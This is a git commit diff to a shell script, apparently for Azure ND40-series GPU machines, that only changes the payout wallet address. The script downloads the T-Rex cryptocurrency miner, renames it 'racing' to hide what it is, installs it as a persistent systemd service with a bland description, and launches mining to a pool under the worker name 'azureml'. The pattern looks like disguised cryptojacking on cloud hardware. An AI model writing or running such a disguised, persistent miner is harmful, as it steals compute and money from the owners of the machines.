2a9a96362e6abd21d909b5233cb96ae6ed437a93
terryjot9 <103128915+terryjot9@users.noreply.github.com>
2022-05-17 13:31:56 +0700

    Update nd40series.sh

--- nd40series.sh
+++ nd40series.sh
@@ -16,7 +16,7 @@ sudo systemctl start nvidia-fabricmanager
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x69d9C862994EE9759ffb0D171AAfDc335f2da312 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x69d9C862994EE9759ffb0D171AAfDc335f2da312 -p x -w azureml &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w azureml &
